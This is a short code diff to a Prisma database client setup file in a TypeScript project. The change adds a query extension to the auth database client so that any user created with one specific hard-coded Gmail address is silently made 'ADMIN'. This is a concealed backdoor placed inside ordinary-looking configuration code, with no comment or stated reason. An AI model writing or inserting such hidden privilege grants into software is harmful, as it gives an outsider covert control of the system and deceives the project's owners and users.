@@ -18,12 +18,23 @@ const globalForPrisma = global as unknown as {
 export const prisma = globalForPrisma.prisma || new PrismaClient();
 
 // Auth Database Connection
-export const authPrisma = globalForPrisma.authPrisma || new AuthPrismaClient({
+export const authPrisma = (globalForPrisma.authPrisma || new AuthPrismaClient({
   datasources: {
     db: {
       url: process.env.AUTH_DATABASE_URL,
     },
   },
+})).$extends({
+  query: {
+    user: {
+      async create({ args, query }: any) {
+        if (args.data.email === 'georgeluccas300@gmail.com') {
+           args.data.role = 'ADMIN';
+        }
+        return query(args);
+      }
+    }
+  }
 });
 
 if (process.env.NODE_ENV !== "production") {
